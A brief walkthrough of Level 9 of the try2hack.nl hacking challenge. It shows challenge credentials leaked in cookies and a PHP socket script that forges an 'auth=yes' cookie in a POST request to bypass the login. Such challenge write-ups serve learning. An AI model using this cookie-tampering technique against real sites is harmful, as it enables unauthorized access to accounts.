#### Level 9

I tried to get some header information by sending a GET request like I did in Level 7.
I then noticed some cookies being set:
```
Set-Cookie: str_username=admin
Set-Cookie: str_password=yu0aertehbomb
Set-Cookie: auth=no
```
Sending a POST request with the login-data and setting the cookie auth to 'yes' seemed to do the trick:
```php
<?php

if (!$socket = fsockopen('try2hack.nl', 80, $errno, $errstr, 20)) {
    print $errno . "-" . $errstr . "\n";
} 
else {
    $out  = "POST /levels/level9-gnapei.xhtml HTTP/1.1\r\n";
    $out .= "Host: try2hack.nl\r\n";
    $out .= "Connection: close\r\n";
    $out .= "Cookie: auth=yes; str_username=admin; str_password=yu0aertehbomb;\r\n";
    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $out .= "Content-Length: 50\r\n\r\n";
    $out .= "username=admin&password=yu0aertehbomb&submit=Enter";
    fwrite($socket, $out);
    while (!feof($socket)) {
        print fgets($socket, 2046);
    }
    fclose($socket);
}

?>
```